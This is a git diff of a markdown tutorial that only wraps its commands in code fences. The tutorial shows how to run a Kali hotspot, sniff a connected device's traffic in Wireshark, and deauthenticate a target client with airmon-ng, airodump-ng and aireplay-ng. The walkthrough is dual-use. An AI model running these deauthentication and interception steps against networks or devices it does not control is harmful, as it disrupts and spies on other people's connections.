@@ -13,7 +13,7 @@ Run `nmtui` and edit the hotspot credentials to match your home network.
 ## Capturing packets
 Capturing packets really is as simple as running Wireshark on the Wi-Fi network interface. Try adding a Wireshark filter and visit https://turpin.dev on your compromised device just so you have some known text to search for.
 
-```
+```text
 frame contains "turpin"
 ```
 
@@ -26,19 +26,25 @@ You'll need two Wi-Fi connections for this: one for the hotspot, one to send mal
 
 List your network interfaces.
 
+```bash
 ip a
+```
 
 If the built-in Wi-Fi is the hotspot, let's insert the USB Wi-Fi adapter and put it into monitor mode.
 
+```bash
 airmon-ng start wlan1
+```
 
 Check your network interfaces again and you'll see it has a "mon" suffix. Now see what devices are out there.
 
+```bash
 airodump-ng wlan1mon --manufacturer
+```
 
 `airodump-ng` lists access points and clients.
 
-```
+```text
 CH 2 ][ Elapsed: 30 s ][ 2019-11-02 14:06
 
 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID
@@ -52,12 +58,16 @@ BSSID STATION PWR Rate Lost Frames Probe
 
 Deauthenticate the target.
 
+```bash
 aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 wlan1
+```
 
 See the [aircrack documentation](https://www.aircrack-ng.org/doku.php?id=deauthentication).
 
 ## Tidying up after yourself
 When you're done take the network interface out of monitor mode and restart your network. But you can just turn off if you don't care. Should the Kali screensaver kick in the default root password is "toor" (root backwards).
 
+```bash
 airmon-ng stop wlan1mon
 systemctl restart network-manager.service
+```
